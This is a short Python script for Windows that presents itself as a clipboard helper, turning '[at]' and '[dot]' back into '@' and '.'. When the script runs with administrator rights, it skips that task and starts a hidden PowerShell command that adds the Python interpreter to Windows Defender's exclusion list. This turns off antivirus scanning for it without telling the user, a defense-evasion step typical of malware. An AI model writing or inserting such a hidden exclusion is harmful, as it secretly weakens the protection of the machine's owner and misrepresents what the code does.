
from sys import exit, executable
import win32process
import win32clipboard
from ctypes import windll
from win32con import SW_HIDE
from win32comext.shell.shell import ShellExecuteEx
from win32comext.shell import shellcon
def getClipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    if len(data) < 50 and '[at]' in data or '[dot]' in data:
        data = data.replace('[at]','@')
        data = data.replace('[dot]','.')
        setClipboard(data)

def setClipboard(text):
    # set clipboard data
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText(text)
    win32clipboard.CloseClipboard()

def runCMD(executable, args = ''):
    showCmd = SW_HIDE
    lpVerb = 'runas'  # causes UAC elevation prompt.
    try:
        procInfo = ShellExecuteEx(nShow=showCmd,
                                  fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                                  lpVerb=lpVerb,
                                  lpFile=executable,
                                  lpParameters=args)
        procHandle = procInfo['hProcess']
        #obj = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
        rc = win32process.GetExitCodeProcess(procHandle)

    except:
        exit()
def is_admin():
    try:
        return windll.shell32.IsUserAnAdmin()
    except:
        return False
if __name__ == '__main__':
    if is_admin():
        runCMD('powershell',
               ' -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath ' + executable)
    else:
        getClipboard()
